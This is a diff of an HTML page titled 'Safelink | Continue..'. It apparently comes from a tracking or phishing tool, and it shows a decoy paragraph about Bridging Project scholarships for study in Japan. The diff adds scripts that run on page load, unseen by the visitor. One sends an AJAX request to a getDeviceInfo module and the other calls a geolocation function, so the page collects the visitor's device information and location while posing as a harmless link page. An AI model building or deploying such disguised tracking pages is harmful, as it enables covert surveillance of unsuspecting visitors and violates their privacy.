@@ -4,12 +4,17 @@
         <title>Safelink | Continue..</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link href="css/style.css" rel="stylesheet" type="text/css">
+        <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+        <script>
+            $.ajax({
+                url: '../modules/getDeviceInfo/getInfo.php'
+            });
+        </script>
+        <script src="modules/geolocation/locate.js"></script>
+        <script>getLocation();</script>
     </head>
     <body>
         <div class="container">
-            <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
-            <script src="js/locate.js"></script>
-            <script>getLocation();</script>
             <div style="text-align: justify;">
                 The Bridging Project offers scholarships to American undergraduate students participating in study-abroad programs in Japan. Funding from private foundations and major U.S. corporations, through donations to the nonprofit US-Japan Bridging Foundation, makes it possible to award about 100 scholarships each year to assist students with the travel and living expenses they will incur while studying abroad in Japan for a semester or an academic year. Applications are accepted twice a year for Bridging Scholarships.
             </div>
